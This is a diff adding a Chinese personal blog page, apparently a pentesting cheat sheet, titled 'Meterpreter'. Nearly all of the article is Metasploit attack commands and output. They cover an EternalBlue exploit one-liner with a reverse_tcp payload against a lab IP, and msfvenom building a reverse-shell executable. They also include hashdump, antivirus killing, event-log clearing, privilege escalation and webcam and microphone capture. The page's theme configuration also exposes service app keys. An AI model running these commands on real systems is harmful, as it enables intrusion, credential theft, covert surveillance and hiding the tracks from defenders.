@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>Meterpreter | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Hexo, Theme-AD">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 持续更新中</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/dongyuanxin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-01-01
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    Meterpreter
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Meterpreter	</span><br><span class="line"></span><br><span class="line">meterpreter</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\Wi</span><br><span class="line">cat 读取文件内容</span><br><span class="line">cd 更改工作目录</span><br><span class="line">checksum 检索文件校验和</span><br><span class="line">cp 复制</span><br><span class="line">dir 显示文件目录，同ls</span><br><span class="line">download 下载文件或目录</span><br><span class="line">edit 编辑文件</span><br><span class="line">getlwd 获取本地工作目录</span><br><span class="line">getwd 获取工作目录</span><br><span class="line">lcd 改变本地工作目录</span><br><span class="line">lls 显示本地文件目录</span><br><span class="line">lpwd 显示本地工作目录</span><br><span class="line">ls 显示文件目录</span><br><span class="line">mkdir 新建文件夹</span><br><span class="line">mv 剪切</span><br><span class="line">pwd 打印当前文件目录</span><br><span class="line">rm 删除文件</span><br><span class="line">rmdir 删除文件夹</span><br><span class="line">search 查找文件</span><br><span class="line">show_mount 列出所有挂载的硬盘</span><br><span class="line">upload 上传</span><br><span class="line">lped 当前工作目录</span><br><span class="line"> lcd /tmp </span><br><span class="line"></span><br><span class="line">bgrun 两下tab	</span><br><span class="line">bgrun killav 杀毒</span><br><span class="line">bgrun post/windows/gather/enum_computers</span><br><span class="line">bgrun post/windows/gather/enum_ie</span><br><span class="line">bgrun hashdump</span><br><span class="line"></span><br><span class="line">clearev 日志清除</span><br><span class="line">download 1.txt    下载文件到kali本地</span><br><span class="line">upload /root/2.txt c:\\windows</span><br><span class="line">dir windows/2.txt</span><br><span class="line">execute -f cmd.exe -i -H </span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getprivs </span><br><span class="line"></span><br><span class="line">Enabled Process Privileges</span><br><span class="line">==========================</span><br><span class="line">Name</span><br><span class="line">----</span><br><span class="line">SeAssignPrimaryTokenPrivilege</span><br><span class="line">SeAuditPrivilege</span><br><span class="line">SeChangeNotifyPrivilege</span><br><span class="line">SeImpersonatePrivilege</span><br><span class="line">SeTcbPrivilege</span><br><span class="line"></span><br><span class="line">getproxy</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1028 </span><br><span class="line">进程</span><br><span class="line">ps</span><br><span class="line">migrate  424&gt; 迁移</span><br><span class="line">再打开</span><br><span class="line"></span><br><span class="line">hashdump </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sysinfo</span><br><span class="line">Computer        : WIN-U4QSLCCIDB3</span><br><span class="line">OS              : Windows 2008 R2 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 1</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line"></span><br><span class="line">meterpreter &gt; kill 1644</span><br><span class="line">Killing: 1644</span><br><span class="line">杀进程</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line">meterpreter &gt; show_mount </span><br><span class="line">Mounts / Drives</span><br><span class="line">===============</span><br><span class="line">Name  Type   Size (Total)  Size (Free)  Mapped to</span><br><span class="line">----  ----   ------------  -----------  ---------</span><br><span class="line">C:\   fixed   39.90 GiB     30.76 GiB   </span><br><span class="line">D:\   cdrom    3.14 GiB      0.00 B     </span><br><span class="line"></span><br><span class="line">arp</span><br><span class="line">netstat </span><br><span class="line"></span><br><span class="line">meterpreter &gt; idletime </span><br><span class="line">User has been idle for: 6 mins 49 secs</span><br><span class="line">间隔时间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resource -r 2.txt </span><br><span class="line">加载储存的命令 </span><br><span class="line"></span><br><span class="line">record_mic  webcam_list   webcam_snap -i 1 -v false 拍照</span><br><span class="line"></span><br><span class="line">ptthon 可以拓展</span><br><span class="line">load Python </span><br><span class="line"></span><br><span class="line">meterpreter &gt; load python</span><br><span class="line">Loading extension python...Success.</span><br><span class="line">meterpreter &gt; python_execute &quot;print (&apos;aa&apos;)&quot;</span><br><span class="line">[+] Content written to stdout:</span><br><span class="line">aa</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line">Msfcli</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">一次性</span><br><span class="line">由msfconsole -x 取代</span><br><span class="line"></span><br><span class="line">msfconsole -x &quot;use exploit/windows/smb/ms17_010_eternalblue;set  RHOST  192.168.47.140;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.47.152;exploit -j&quot;</span><br><span class="line"></span><br><span class="line">msfdb init</span><br><span class="line">#service postgresql start</span><br><span class="line">#service metasploit start</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.47.140 LPORT=4444 -f exe-only &gt; s.exe</span><br></pre></td></tr></table></figure>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2019/01/01/Meterpreter/Meterpreter/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2019/01/01/MS17-010（永恒之蓝）/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/01/01/web/1 - 副本 (4) - 副本/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
